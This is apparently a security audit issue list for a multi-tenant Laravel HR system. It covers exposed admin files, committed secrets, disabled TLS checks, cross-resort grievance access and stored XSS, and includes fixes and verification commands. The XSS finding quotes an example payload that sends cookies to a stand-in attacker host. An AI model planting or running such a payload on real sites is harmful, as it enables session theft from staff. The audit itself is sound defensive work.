# SECURITY AUDIT — MASTER ISSUE LIST

> **Audience:** Ankit, working through this file with Claude Code.
> **Audited branch:** `upgrade/php85-laravel13` (the live Laravel 13 / PHP 8.3+ branch), at commit `448586d6c`.
> **Scope:** tenant isolation (cross-resort data access), data leaks, exposed secrets/files, frontend (XSS, uploads), auth/session/token hardening.
> **How this file was produced:** read-only research. No code was changed while writing it. Every finding below was traced in the code, not just grep-matched, unless it is explicitly marked `LIKELY` (i.e. strong evidence, still needs a live reproduction).
>
> This file grows stage by stage. Stages marked `PENDING AUDIT` haven't been researched yet. Don't invent issues for them.

---

## 0. INSTRUCTIONS FOR CLAUDE CODE (read before touching anything)

You are fixing security issues in a multi-tenant HR system (one resort = one `resort_id`). A careless "fix" can take production down or lock a resort out of its own data. Follow these rules exactly.

### 0.1 Working rules

1. **Read `CLAUDE.md` in the repo root first.** Its "Hard invariants" section applies to every fix here (migrations only, `StorageHelper` only, `resort_id` scoping, duplicate query paths per view).
2. **Work one issue ID at a time**, in the order of the Status Board (§1). Do not batch several issues into one change unless the issue text says to.
3. **Stay inside the issue's scope.** If you notice a different problem while fixing one, add it to §9 "Found while fixing" at the bottom of this file. Don't fix it in the same change.
4. **Steps marked `HUMAN` cannot be done by you** (rotating passwords at a provider, changing server config, checking the live site). Stop at those steps, tell Ankit exactly what to do, and wait for him to confirm before continuing.
5. **Never print, paste, or commit a secret value** (passwords, keys, tokens). When you need to compare or confirm a secret, compare lengths or hashes (`sha256sum`), never the value.
6. **One commit per issue ID**, message format: `security(<ISSUE-ID>): <short description>`.

### 0.2 Verification gates — MANDATORY

Every issue has a **VERIFY** block. An issue is **not done** until every command in its VERIFY block has been run and its output matches the "expected" line.

- You must **paste the actual command output** into your reply to Ankit for each VERIFY step. "I checked and it's fine" is not acceptable.
- If any VERIFY step fails or gives unexpected output: **the issue stays OPEN.** Diagnose, fix, and re-run the **whole** VERIFY block from the top.
- Once VERIFY passes, update that issue's row in §1 to `FIXED — <commit hash> — verified <date>`. Never mark a row `FIXED` without a commit hash.
- **After every 3 issues, run the REGRESSION GATE (§0.3)** before starting the next issue.

### 0.3 Regression gate (run after every 3 fixed issues, and at the very end)

```bash
# 1. Every PHP file you touched parses
git diff --name-only <commit-before-you-started>..HEAD -- '*.php' | xargs -r -n1 php -l

# 2. App boots and routes compile
php artisan route:list > /dev/null && echo "ROUTES OK"
php artisan config:cache && php artisan config:clear && echo "CONFIG OK"

# 3. Nothing outside the fixed issues changed
git diff --stat <commit-before-you-started>..HEAD
```
Expected: no parse errors, `ROUTES OK`, `CONFIG OK`, and the diff stat lists **only** files named in the issues you fixed. If an unexpected file appears, explain why or revert it.

### 0.4 Final gate (after the last issue in a stage)

Re-read this whole stage and, for each issue, re-run its VERIFY block one more time on the final state of the branch (a later fix can undo an earlier one). Report a table: `Issue ID | VERIFY re-run result | commit`.

### 0.5 Cross-tenant test harness (used by every tenant-isolation VERIFY from Stage 2 on)

A tenant-isolation fix is proven only when a user from **resort A** tries to act on a record belonging to **resort B** and **nothing in B changes**. Code inspection alone doesn't count. Run it in `php artisan tinker` against a DB with at least two resorts, **always inside a transaction that is rolled back**:

```php
DB::beginTransaction();
try {
    // 1. Log in as a portal user of resort A (pick any active one).
    $userA = \App\Models\ResortAdmin::whereNotNull('resort_id')->where('status', 'Active')->first(); // adjust status column if different
    auth()->guard('resort-admin')->setUser($userA);

    // 2. Pick a record that belongs to a DIFFERENT resort.
    $foreign = \App\Models\GrivanceSubmissionModel::where('resort_id', '!=', $userA->resort_id)->first();
    $before  = $foreign->fresh()->getAttributes();

    // 3. Build the request exactly as the browser would send it.
    $req = \Illuminate\Http\Request::create('/', 'POST', [/* fields from the issue */]);
    app()->instance('request', $req);

    // 4. Resolve the controller AFTER setUser (constructors read the logged-in user).
    $ctrl = app(\App\Http\Controllers\Resorts\GrievanceAndDisciplinery\GrivanceController::class);
    try { $res = $ctrl->METHOD($req); echo 'HTTP ' . (method_exists($res, 'getStatusCode') ? $res->getStatusCode() : 'view') . PHP_EOL; }
    catch (\Symfony\Component\HttpKernel\Exception\HttpException $e) { echo 'HTTP ' . $e->getStatusCode() . PHP_EOL; }

    // 5. Prove the foreign record did not change.
    $diff = array_diff_assoc($foreign->fresh()->getAttributes(), $before);
    echo empty($diff) ? "FOREIGN RECORD UNCHANGED\n" : 'CHANGED: ' . json_encode($diff) . PHP_EOL;
} finally {
    DB::rollBack();
}
```
**Pass condition for every cross-tenant VERIFY:** the response is `403`/`404` (or a JSON `success:false`) **and** the output says `FOREIGN RECORD UNCHANGED`. For delete endpoints, check `Model::find($foreign->id)` still returns the row. Also run the **same-resort** case (a record in A's own resort) to prove the fix didn't break the normal path. It must still succeed.

**Before-fix proof is required:** run the harness once **before** changing the code and paste the output that shows the leak (`CHANGED: …`). Then fix, re-run, and paste the passing output. A fix with no "before" proof doesn't count as verified.

---

## 1. STATUS BOARD

Severity scale: **CRITICAL** = exploitable now from the internet, or exposes all tenants · **HIGH** = one tenant's data exposed/changed by another, or a serious weakening · **MEDIUM** = needs extra conditions · **LOW** = hygiene.

| ID | Stage | Severity | Title | Status |
|---|---|---|---|---|
| S1-01 | 1 | CRITICAL | `public/info.php` exposes `phpinfo()` to the internet | OPEN |
| S1-02 | 1 | CRITICAL | `public/adminer.php` — full database admin tool reachable from the internet | OPEN |
| S1-03 | 1 | CRITICAL | `.env.staging` committed with real secrets (APP_KEY, DB, mail) | OPEN |
| S1-04 | 1 | HIGH | TLS certificate verification disabled for Wasabi / S3 / Pusher | OPEN |
| S1-05 | 1 | LOW | Stray `public/Kernel.php` copy of the HTTP kernel | OPEN |
| S1-06 | 1 | LOW | Guessable Pusher credential fallbacks in `config/broadcasting.php` | OPEN |
| S1-07 | 1 | LOW | Developer's real name/email in public import template | OPEN |
| S2-01 | 2 | HIGH | Investigation actions (assign committee, GM decision) can change another resort's grievance | OPEN |
| S2-02 | 2 | HIGH | "Request witness statement" works on another resort's grievance and notifies its witnesses | OPEN |
| S2-03 | 2 | HIGH | Grievance settings: 7 deletes + 2 edits work across resorts; no permission checks at all | OPEN |
| S2-04 | 2 | HIGH | Stored XSS — employee-written grievance text runs as code in HR's browser | OPEN |
| S2-05 | 2 | HIGH | Confidential grievant's identity leaks (History & Logs, push notification, file folder) | OPEN |
| S2-06 | 2 | HIGH | No role checks — any portal user can run committee / GM / HR / appeal-decision actions | OPEN |
| S2-07 | 2 | HIGH | "Secure" file encryption key read with `env()` — likely empty in production (all modules) | OPEN |
| S2-08 | 2 | MEDIUM | Investigation files of different grievances overwrite each other; web uploads have no file-type check | OPEN |
| S2-09 | 2 | MEDIUM | DECISION NEEDED — grievant's app shows witness statements and internal committee notes | OPEN |
| S2-10 | 2 | LOW | Grievance numbers are one global sequence across all resorts | OPEN |
| S2-11 | 2 | LOW | Mobile witness-statement lookup not scoped (safe today, defence in depth) | OPEN |
| X-01 | cross-cutting | HIGH | Portal permission check allows every route not listed in `module_pages` (~91% of routes) | DECISION NEEDED |
| — | 3 | — | Super-admin support view stored XSS | PENDING AUDIT |
| — | 4 | — | Passport token expiry | PENDING AUDIT |
| — | 5 | — | CORS allows every origin | PENDING AUDIT |
| — | 6+ | — | Module-by-module sweep (tenant isolation + frontend XSS + uploads) | PENDING AUDIT |

---

## 2. STAGE 1 — Exposed files & committed secrets

**Why this stage is first:** these can be exploited today by anyone on the internet who knows or guesses the URL, with no login, and they expose **every resort at once**, not just one tenant.

**Key facts established during the audit:**
- `public/` is the web root. Any `.php` file in it runs when its URL is requested.
- Only `public/index.php` should be a PHP file in `public/`. Right now there are four: `index.php`, `info.php`, `adminer.php`, `Kernel.php`.
- All three stray files and `.env.staging` arrived in commit `9f9cfdbfa` (2026-08-15). The clone is shallow, so older history couldn't be checked. **Assume the secrets have been in git history since the repo was created and treat them as compromised.**
- Nothing in the application code, config, or build scripts references `info.php`, `adminer.php`, or `.env.staging` (checked; the only hit is a comment in `app/Helpers/Common.php:8709`). Removing them can't break the app.

---

### S1-01 · CRITICAL · `public/info.php` exposes `phpinfo()`

**Where:** `public/info.php` (entire file is `<?php phpinfo(); ?>`).

**What an attacker gets:** opening `https://<your-domain>/info.php` in a browser shows the full PHP/server configuration, often including **environment variables** (DB credentials, Wasabi keys, OpenRouter key, mail password), server paths, PHP version and enabled extensions. That's everything needed to plan the next attack. No login required.

**Fix:**
1. `git rm public/info.php`
2. Don't replace it with anything. If you need PHP info for debugging, run `php -i` over SSH.

**`HUMAN` step (Ankit):** after deploy, delete the file from **every** server that has this code (production, staging, the old `projects.spaculus.live` host). A git deploy that only pulls may leave untracked copies behind.

**VERIFY:**
```bash
git ls-files public/info.php
```
Expected: *(no output)*
```bash
# HUMAN runs against every live host after deploy:
curl -s -o /dev/null -w '%{http_code}\n' https://<prod-domain>/info.php
```
Expected: `404` (anything else, and especially `200`, means it's still exposed).

---

### S1-02 · CRITICAL · `public/adminer.php` — database admin tool on the internet

**Where:** `public/adminer.php` (476 KB, Adminer — a single-file phpMyAdmin alternative).

**What an attacker gets:** a login page that connects **straight to the database**, bypassing the application and all its `resort_id` checks. Combined with S1-03 (the DB password is in git), anyone with repo access, or anyone the repo leaks to, may be able to log in and read or change **every resort's data**: salaries, passports, visas, grievances, everything. Even without the password, it's a brute-force target. Older Adminer versions also have publicly known vulnerabilities (e.g. server-side request forgery and file reading).

**Fix:**
1. `git rm public/adminer.php`
2. Don't move it elsewhere in the repo. For DB access, use an SSH tunnel (`ssh -L 3306:127.0.0.1:3306 user@server`) plus a desktop client (TablePlus / DBeaver / MySQL Workbench).

**`HUMAN` step (Ankit):**
- Delete the file from every server, same as S1-01.
- Check the web server access logs for any past requests to `/adminer.php`. If there are hits from IPs that aren't the team's, treat it as a **possible breach** and escalate. Don't just delete the file and move on.
  ```bash
  sudo grep -h "adminer.php" /var/log/nginx/access.log* /var/log/apache2/access.log* 2>/dev/null | awk '{print $1}' | sort | uniq -c | sort -rn
  # (zgrep for .gz rotated logs)
  ```

**VERIFY:**
```bash
git ls-files public/adminer.php
```
Expected: *(no output)*
```bash
# HUMAN, every live host:
curl -s -o /dev/null -w '%{http_code}\n' https://<prod-domain>/adminer.php
```
Expected: `404`

---

### S1-03 · CRITICAL · `.env.staging` committed with real secrets

**Where:** `.env.staging` (repo root, tracked in git; last changed in commit `3decf65bb`, 2026-09-21).

**What's in it (values deliberately not reproduced here):**

| Key | Assessment |
|---|---|
| `APP_KEY` | Real Laravel key (`base64:` format). |
| `DB_USERNAME` / `DB_PASSWORD` | Real-looking, not a placeholder. DB name `buvdb`, host `127.0.0.1`. |
| `MAIL_USERNAME` / `MAIL_PASSWORD` | `smtp.gmail.com`; the password has the exact shape of a **Google App Password** (16 lowercase letters). Anyone with it can **send email as that account** (phishing that looks official). |
| `REDIS_PASSWORD` | `null` — no secret. |
| `APP_ENV=production` | Mislabelled: `APP_URL` points at `projects.spaculus.live`, the old third-party staging host. |

**Why it matters:**
- Everyone who has ever had repo access (developers, contractors, CI services, any laptop that cloned it) has these values. **Deleting the file doesn't remove it from git history.**
- `APP_KEY` encrypts each resort's SMTP password in the DB (`app/Models/ResortSmtpConfig.php:36-44`, `Crypt::encryptString`). **If production uses the same `APP_KEY`**, anyone holding the repo plus a copy of the DB can decrypt every resort's mail password.
- `.gitignore` ignores `.env`, `.env.backup`, `.env.production` — but **not** `.env.staging`, and not any other `.env.*` names.

**Fix — code part (Claude Code):**
1. `git rm --cached .env.staging` (keep a local copy only if Ankit needs it; never re-commit it).
2. In `.gitignore`, replace the individual `.env*` lines with a pattern that ignores every env file except the example:
   ```gitignore
   .env
   .env.*
   !.env.example
   ```
3. Check `.env.example` holds **placeholders only** (it currently has short dummy values; confirm none are real).

**Fix — `HUMAN` part (Ankit). Do these in order; this is the part that actually removes the risk:**
1. **Find out whether production reuses any of these values.** On the prod server, compare hashes rather than values:
   ```bash
   # run on prod box and on a machine with the repo; compare the hashes, never the values
   grep -E '^(APP_KEY|DB_PASSWORD|MAIL_PASSWORD)=' .env | sha256sum   # prod .env
   grep -E '^(APP_KEY|DB_PASSWORD|MAIL_PASSWORD)=' .env.staging | sha256sum
   # or per key: grep '^APP_KEY=' .env | sha256sum
   ```
2. **Revoke the Gmail App Password** in the Google account (Security → App passwords) and create a new one. Put the new one **only** in the server's `.env`.
3. **Change the MySQL password** for that DB user on every server where it's used. Update the server `.env`. Never commit it.
4. **`APP_KEY` — only if production shares the staging key** (step 1). Rotating it has side effects: all users get logged out, and **every resort's stored SMTP password becomes unreadable** (`getPasswordAttribute` → `Crypt::decryptString` throws). Safe procedure:
   - a. Before rotating, export the decrypted SMTP passwords with a one-off script run in `php artisan tinker` (keep them in memory or a secure temp file, never in git).
   - b. Set the new `APP_KEY` (`php artisan key:generate --show`, paste into the prod `.env` by hand).
   - c. Re-save each `ResortSmtpConfig` password so it's encrypted with the new key.
   - d. Alternative: Laravel 13 supports `APP_PREVIOUS_KEYS` for gradual rotation, but `config/app.php` currently has **no `previous_keys` entry** (only `'key' => env('APP_KEY')` at line 123), so that entry would have to be added first.
   - If production does **not** share the key, rotating isn't required. Just make sure the new production server gets its own freshly generated key.
5. **Optional, a team decision:** purge `.env.staging` from git history (`git filter-repo --path .env.staging --invert-paths`). This rewrites history and needs a force-push plus every developer re-cloning. **Rotation (steps 2-4) is mandatory; purging history is not a substitute for it.**

**VERIFY (Claude Code):**
```bash
git ls-files | grep -E '^\.env' 
```
Expected: exactly one line: `.env.example`
```bash
git check-ignore -v .env.staging .env.production .env.local
```
Expected: all three reported as ignored by the `.env.*` rule.
```bash
git check-ignore .env.example; echo "exit=$?"
```
Expected: `exit=1` and nothing else printed (`.env.example` itself is **not** ignored).

**VERIFY (`HUMAN` — Ankit confirms in writing):**
- [ ] Gmail App Password revoked and replaced
- [ ] DB password changed on every server that used it
- [ ] `APP_KEY` decision recorded: "prod shares staging key: yes/no → rotated: yes/not needed"
- [ ] If rotated: send a test email from one resort's SMTP settings and confirm it still sends (proves the SMTP passwords were re-encrypted)

---

### S1-04 · HIGH · TLS certificate verification disabled (Wasabi, S3, Pusher)

**Where:**
- `config/filesystems.php:69-71` — `s3` disk: `'http' => ['verify' => false]`
- `config/filesystems.php:83-85` — `wasabi` disk: `'http' => ['verify' => false]`
- `config/broadcasting.php:45-46` — Pusher: `CURLOPT_SSL_VERIFYHOST => 0`, `CURLOPT_SSL_VERIFYPEER => 0`

**Why it matters:** production runs `STORAGE_DRIVER=wasabi`, so **every uploaded file** — passports, visas, contracts, payslips, grievance attachments — plus the Wasabi access key travel between the app server and Wasabi over a connection whose certificate is **never checked**. Anyone who can intercept that network path (a compromised network hop, a hostile DNS answer) can pose as Wasabi, read or alter files, and capture the storage credentials. The comment above the S3 block ("Tell the AWS SDK exactly which CA root certificates to use") suggests this was added to get past a missing-CA error on some server, not as a deliberate choice.

**Fix:**
1. Remove the three `verify => false` / `CURLOPT_SSL_VERIFY* => 0` settings (delete the `'http' => [...]` blocks and the two `CURLOPT` lines).
2. If a server then fails with a certificate error, fix the **server**, not the code: `HUMAN` installs/updates the CA bundle (`sudo apt install --reinstall ca-certificates` / `update-ca-certificates`) and makes sure `php.ini` `curl.cainfo` / `openssl.cafile` point to it. If a custom CA path is really needed, use `'verify' => env('STORAGE_CA_BUNDLE', true)`, never `false`.
3. **Test on staging before production.** If the certificate chain is broken on the prod box, this change will stop uploads there.

**VERIFY:**
```bash
grep -rnE "'verify'\s*=>\s*false|CURLOPT_SSL_VERIFY(HOST|PEER)\s*=>\s*(0|false)" config app
```
Expected: *(no output)*
```bash
# Round-trip a file through the real storage disk (run on staging, then prod):
php artisan tinker --execute="
\$p='healthcheck/tls-'.uniqid().'.txt';
\App\Helpers\StorageHelper::put(\$p,'ok');
echo \App\Helpers\StorageHelper::get(\$p) === 'ok' ? 'STORAGE TLS OK' : 'MISMATCH';
\App\Helpers\StorageHelper::delete(\$p);
"
```
Expected: `STORAGE TLS OK`. (`StorageHelper::put/get/delete` exist at `app/Helpers/StorageHelper.php:48/53/63`. Run this on a box where the default disk is `wasabi`, or it proves nothing about Wasabi.)

---

### S1-05 · LOW · Stray `public/Kernel.php`

**Where:** `public/Kernel.php`, an indented copy of `app/Http/Kernel.php` sitting in the web root.

**Why it matters:** it's executable from the web (`/Kernel.php`). Today it only declares a class, so running it does nothing harmful, but it reveals the app's middleware setup, and it's the kind of stray file that turns into a real problem when someone edits it later. Rule: `public/` holds `index.php` and static assets only.

**Fix:** `git rm public/Kernel.php`. Confirm nothing references it:
```bash
grep -rn "public/Kernel.php" --exclude-dir=vendor --exclude-dir=node_modules .
```
Expected: *(no output)* before removing.

**VERIFY (covers S1-01, S1-02, S1-05 together):**
```bash
git ls-files public | grep -E '\.php$' | grep -v '/vendor/'
```
Expected: exactly one line: `public/index.php`

---

### S1-06 · LOW · Guessable Pusher credential fallbacks in config

**Where:** `config/broadcasting.php:35-37` — `env('PUSHER_APP_KEY', 'local')`, `env('PUSHER_APP_SECRET', 'your-secret')`, `env('PUSHER_APP_ID', 'app-id')`.

**What it is:** these are placeholder values, not leaked real credentials. The risk is the silent fallback: if production's `.env` is ever missing `PUSHER_APP_SECRET`, the app quietly runs with the world-known secret `your-secret`, and anyone can then **sign fake real-time events** against a self-hosted websocket server. Secrets should fail loudly when missing, not fall back to a guessable default.

**Fix:** remove the fallbacks for `key`, `secret`, `app_id` (make them `env('PUSHER_APP_KEY')` etc. with no second argument). Leave the non-secret fallbacks (`port`, host/scheme) alone. `HUMAN`: confirm the prod `.env` defines `PUSHER_APP_KEY`, `PUSHER_APP_SECRET`, `PUSHER_APP_ID` **before** deploying this, or real-time features will stop.

**VERIFY:**
```bash
grep -nE "env\('PUSHER_APP_(KEY|SECRET|ID)',\s*'" config/broadcasting.php
```
Expected: *(no output)*
```bash
# HUMAN, on prod, after deploy:
php artisan tinker --execute="echo strlen((string) config('broadcasting.connections.pusher.secret')) > 0 ? 'PUSHER SECRET SET' : 'MISSING';"
```
Expected: `PUSHER SECRET SET`

---

### S1-07 · LOW · Developer's real details in a public download

**Where:** `public/resorts_assets/demofiles/Employee.xlsx`, the bulk employee-import template, publicly downloadable. Its sample row contains a real developer name and a real `@spaculus.com` email address, and the template has a `Password` column.

**Why it matters:** minor, but it's exactly the kind of thing an international client's security reviewer flags ("personal data in public assets"). It leaks a named person's work email (a phishing target) and hints that bulk import accepts plaintext passwords.

**Fix:** replace the sample row with obvious fake data (`Jane Doe`, `jane.doe@example.com`, password `ChangeMe123!` or leave it blank). Don't change the column headers; the import code depends on them. This is a data file only, not code.

**VERIFY:**
```bash
unzip -p public/resorts_assets/demofiles/Employee.xlsx xl/sharedStrings.xml | grep -oiE '[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}'
```
Expected: only `@example.com` addresses.

---

### Stage 1 — checked and found clean

So Claude Code doesn't spend time re-auditing these:
- No private keys, certificates, Passport `oauth-*.key` files, or Firebase/Google service-account JSON are tracked in git.
- No `.sql`, `.zip`, `.bak`, `.log` or other dump/backup files are tracked under `public/`.
- No hardcoded OpenRouter / OpenAI / AWS / GitHub / Slack tokens were found in `app/`, `config/`, `routes/`, `resources/`, `database/`, or the app's own JS under `public/`.
- `public/resorts_assets/Applicants/…/user-2.svg` and `public/images/cards/*.svg` are static icons, not uploaded applicant data.
- The Google Maps embed key in `database/seeders/PreviousWeekAttendanceSeeder.php:139` is a browser-side embed key (these are public by design). `HUMAN`: make sure that key is restricted to your domains in Google Cloud Console.

---

## 3. STAGE 2 — Grievance module

**Scope audited:** every grievance route in `routes/resort_route.php` (≈60) and `routes/api.php` (10), across:
- `app/Http/Controllers/Resorts/GrievanceAndDisciplinery/GrivanceController.php` (web: list, create, investigation, identity, statements, history, delete, PDF)
- `app/Http/Controllers/Resorts/GrievanceAndDisciplinery/GrievanceAppealController.php` (web: appeals)
- `app/Http/Controllers/Resorts/GrievanceAndDisciplinery/ConfigurationController.php` (grievance settings methods only)
- `app/Http/Controllers/API/GrievanceController.php` (mobile)
- Views in `resources/views/resorts/GrievanceAndDisciplinery/grivance/` and `.../HistoryAndLogs/`

**Not in this stage:** the Disciplinary half of the module (`DisciplinaryController.php`, disciplinary config methods). That comes in the module sweep.

**Two facts that shape every fix in this stage:**
1. **Grievance IDs are guessable.** Record IDs are sequential integers, and the "encoding" in URLs is plain `base64` (e.g. `MTIz` = `123`). Anyone can decode one and try the next number. Human-readable numbers (`GR-0001`, `GR-0002`…) are **one global sequence across all resorts** (S2-10). A `resort_id` check on the server is the only real protection.
2. **The portal's permission check lets through any route not listed in `module_pages`** (see X-01). Of about 60 grievance routes, **only 4 are listed** (`grivance.GrivanceIndex`, `config.index`, `Hrdashboard`, `Disciplinary.DisciplinaryIndex`). Every other grievance action is open to **any logged-in portal user of the resort**, whatever their role, unless the method checks permissions itself, and most don't.

**Correction to an earlier chat claim:** the committee **edit** branch (`InvestigationReportStore`, `flag=EditModeForCommittee`, `GrivanceController.php:526-710`) was described as able to change another resort's grievance. On the current branch that's **blocked, but only by accident**: the committee-membership check rejects assigned foreign grievances, and for unassigned ones the code crashes on a null investigation record before committing. It still gets the scoping fix in S2-01 because it's one refactor away from being exploitable, but it isn't a confirmed leak today.

---

### S2-01 · HIGH · Investigation actions can change another resort's grievance

**Where:** `GrivanceController::InvestigationReportStore()` — `GrivanceController.php:471-756`, one method with three branches picked by `$request->flag`:

| Branch | Lines | Lookup | Confirmed effect on a grievance from another resort |
|---|---|---|---|
| `flag=AssignToComittee` | 474-525 | `GrivanceSubmissionModel::where('id',$id)->update(...)` at **500** | **Committed.** Sets `Assigned=Yes`, `status=in_review` and `Committee_id` on the foreign grievance, and creates an investigation row pointing at it (499). The `assign_to` committee IDs are only checked to be integers, never that the committee belongs to this resort (481-482). |
| any other `flag` value (GM decision) | 711-755 | `GrivanceSubmissionModel::where("id",...)->first()` at **716** | **Committed.** Overwrites `Gm_Decision`, `Rejection_reason`, `Gm_Resoan`, `SentToGM` on the foreign grievance, and sends the foreign grievant a "GM decision" notification (725-732). |
| `flag=EditModeForCommittee` | 526-710 | `find()` at **532**, `where('id')->update` at **607 / 613 / 639**, investigation lookups at **533 / 664** | Blocked by accident today (see correction above). Scope it anyway. |

**Fix:**
1. At the very top of `InvestigationReportStore()`, before the `if/elseif/else`, load the grievance **once**, scoped:
   ```php
   $grievance = GrivanceSubmissionModel::where('id', $request->Grievant_form_id)
       ->where('resort_id', $this->resort->resort_id)
       ->first();
   if (!$grievance) {
       return response()->json(['success' => false, 'message' => 'Grievance not found.'], 404);
   }
   ```
   Then use `$grievance->id` (not the raw request value) in **every** later query in all three branches: lines 499, 500, 532, 533, 607, 611, 613, 623, 639, 664, 716.
2. In the `AssignToComittee` branch, reject committee IDs that don't belong to this resort:
   `GrievanceCommitteeMemberParent::where('id', $committee_ids)->where('resort_id', $this->resort->resort_id)->exists()` → otherwise 422. (`assign_to` is validated as an array but stored as `Committee_id`. Check which shape the form really sends before writing the check.)
3. In the `EditModeForCommittee` branch, return a clean 422 when `$gr_investigation` is null (line 664) instead of crashing on line 674.
4. Role checks for these branches are handled in **S2-06**. Don't mix them into this commit.

**VERIFY:** use the §0.5 harness with `METHOD = InvestigationReportStore`, run three times:
- `['flag' => 'AssignToComittee', 'Grievant_form_id' => $foreign->id, 'assign_to' => [<a committee id of resort A>]]` → expect `404` + `FOREIGN RECORD UNCHANGED`, and `GrivanceInvestigationModel::where('Grievance_s_id', $foreign->id)->where('resort_id', $userA->resort_id)->exists()` → `false`.
- `['flag' => 'GmDecision', 'Grievant_form_id' => $foreign->id, 'Gm_Decision' => 'X', 'Rejection_reason' => 'X', 'Gm_Resoan' => 'X']` → expect `404` + `FOREIGN RECORD UNCHANGED`.
- `['flag' => 'EditModeForCommittee', 'Grievant_form_id' => $foreign->id, 'outcome_type' => 'DeliverToHr']` → expect `404` + `FOREIGN RECORD UNCHANGED`.
- Same-resort control: repeat the `AssignToComittee` call with a grievance and committee from resort A → must succeed (`success: true`).
```bash
grep -nE "Grievant_form_id\)" app/Http/Controllers/Resorts/GrievanceAndDisciplinery/GrivanceController.php | grep -vE "^\s*[0-9]+:\s*//"
```
Expected: the only remaining hit is the single scoped lookup added in step 1.

---

### S2-02 · HIGH · "Request witness statement" works across resorts

**Where:** `GrivanceController::RequestForStatement()` — `GrivanceController.php:886-925`.
`GrivanceSubmissionModel::where('Grivance_id',$id)->first()` at **889**, no `resort_id`. It looks up by the human number (`GR-0042`), which is a **global** sequence (S2-10), so any number maps to exactly one grievance in some resort.

**Confirmed effect:** a portal user in resort A who sends `id=GR-0042` flags resort B's grievance `RequestforStatment=Yes` (890-891), sets all of B's witnesses to `status=Requested` (892), and **sends B's witnesses in-app and mobile push notifications** naming the case number (894-919). Also: an unknown number crashes on line 890 (null), giving a 500.

**Fix:** add `->where('resort_id', $this->resort->resort_id)` to line 889 and return 404 when it's null. Role check → S2-06.

**VERIFY:** §0.5 harness, `METHOD = RequestForStatement`, request `['id' => $foreign->Grivance_id]` → expect `404` + `FOREIGN RECORD UNCHANGED`, and
`\App\Models\GrivanceSubmissionWitness::where('G_S_Parent_id', $foreign->id)->where('status','Requested')->count()` is the same before and after. Same-resort control must still succeed. Also `['id' => 'GR-99999']` → `404`, not `500`.

---

### S2-03 · HIGH · Grievance settings: cross-resort deletes and edits

**Where:** `ConfigurationController.php` (grievance settings methods). This controller has **zero** permission checks (see S2-06), and these methods have **no `resort_id` filter**:

| Method | Line | Unscoped query | Effect on another resort |
|---|---|---|---|
| `GrievanceCategoryDestory` | 2127 | `GrievanceCategory::where("id",$id)->delete()` | **Deletes** its grievance category |
| `GrievanceSubCategoryDestory` | 2297 | `GrievanceSubcategory::where("id",$id)->delete()` | **Deletes** its sub-category |
| `GrievanceCatAndSubCategoryDestory` | 2559 | `GrievanceCategoryAndSubcatModel::where("id",$id)->delete()` | **Deletes** its priority mapping |
| `GrievanceDelegeationRuleDestory` | 2771 | `GrievanceDelegationRuleModel::where("id",$id)->delete()` | **Deletes** its delegation rule |
| `GrivanceTempleteDestory` | 3058 | `GrievanceTempleteModel::where("id",$id)->delete()` | **Deletes** its template |
| `GrievanceEscalationDestory` | 3292 | `GrivanceEscaltionModel::where("id",$id)->delete()` | **Deletes** its escalation rule |
| `GrievanceDelegeationRuleinlineUpdate` | 2700 (update at ~2747) | `GrievanceDelegationRuleModel::where("id",$Main_id)->update(...)` | **Edits** its delegation rule |
| `GrievanceEscalationinlineUpdate` | 3224 (update at ~3269) | `GrivanceEscaltionModel::where('id', $mainId)->update(...)` | **Edits** its escalation rule |
| `GrievanceTempleteEdit` | 3042 | `GrievanceTempleteModel::find($id)` | **Reads** its template (and 500s on an unknown id) |
| `GrievanceCategoryWiseSubCategoryData` | 2321 | `GrievanceSubcategory::where("Grievance_Cat_id",...)` | **Reads** its sub-category list |

The IDs are `base64` of sequential integers, so this is trivially scriptable: loop over IDs and wipe every resort's grievance setup. The sibling `GrivevanceCommitteesDestory` (line 3538) and the category/sub-category inline updates (2074, 2240, 2486) are already scoped correctly. **Copy their pattern.**

**Fix:** for each row, add `->where('resort_id', $this->resort->resort_id)` to the query, and for the deletes/edits return `404` when nothing matched (check `->exists()` first, or check the affected-row count). Don't change anything else in these methods.

**Also check when fixing (same pattern, lower impact):** the grievance **store** paths accept `Grivance_Cat_id` / `Grivance_Sub_cat` / `Grievance_Cat_id` without checking they belong to this resort (`GrivanceController.php:341-342`, `API/GrievanceController.php:196-197`, `ConfigurationController.php:2491-2492` uses a bare `exists:grievance_categories,id`). Use `Rule::exists(...)->where('resort_id', …)` the way `GrievanceAppealController.php:204-207` already does.

**VERIFY:** for **each** of the 10 methods, run the §0.5 harness with a foreign record of that model (`GrievanceCategory`, `GrievanceSubcategory`, `GrievanceCategoryAndSubcatModel`, `GrievanceDelegationRuleModel`, `GrievanceTempleteModel`, `GrivanceEscaltionModel`) and the id passed exactly as the route expects (`base64_encode($foreign->id)` for the `{id}` routes). Expect `404` + the foreign row still exists and is unchanged. Paste a 10-row result table. Same-resort control: delete one of resort A's own categories → must succeed.
```bash
f=app/Http/Controllers/Resorts/GrievanceAndDisciplinery/ConfigurationController.php
for m in GrievanceCategoryDestory GrievanceSubCategoryDestory GrievanceCatAndSubCategoryDestory GrievanceDelegeationRuleDestory GrivanceTempleteDestory GrievanceEscalationDestory GrievanceDelegeationRuleinlineUpdate GrievanceEscalationinlineUpdate GrievanceTempleteEdit GrievanceCategoryWiseSubCategoryData; do
  s=$(grep -n "function $m(" $f | cut -d: -f1); e=$(awk -v s=$s 'NR>s && /public function/ {print NR; exit}' $f)
  echo "$m resort_id-mentions=$(sed -n "${s},${e}p" $f | grep -c resort_id)"; done
```
Expected: every method shows `resort_id-mentions` ≥ 1.

---

### S2-04 · HIGH · Stored XSS — grievance text runs as code in HR's browser  ·  *Frontend fix (Blade) + one controller line*

**What it is:** any employee can type HTML/JavaScript into a grievance from the **mobile app** (no sanitising in `API/GrievanceController.php:205-208`) or the web form. When HR or a committee member opens the case, the portal renders that text **unescaped**, so the script runs **as HR, inside HR's logged-in session**. It could read every resort record HR can see or act as HR. Example payload in the description field: `<img src=x onerror="fetch('https://attacker/?c='+document.cookie)">`.

**Where it's rendered raw:**

| File:line | Field | Who writes it |
|---|---|---|
| `resources/views/resorts/GrievanceAndDisciplinery/grivance/investigationreport.blade.php:124` | `Grivance_description` | **Any employee** (mobile/web) — plain text |
| `resources/views/resorts/GrievanceAndDisciplinery/grivance/Investigationinfo.blade.php:91` | `Grivance_description` | **Any employee** — plain text |
| `investigationreport.blade.php:276` | `Gm_Resoan` | whoever submits the GM decision (S2-06: any portal user) — plain text |
| `investigationreport.blade.php:215`, `Investigationinfo.blade.php:186` | `follow_up_description` | committee (see S2-06) |
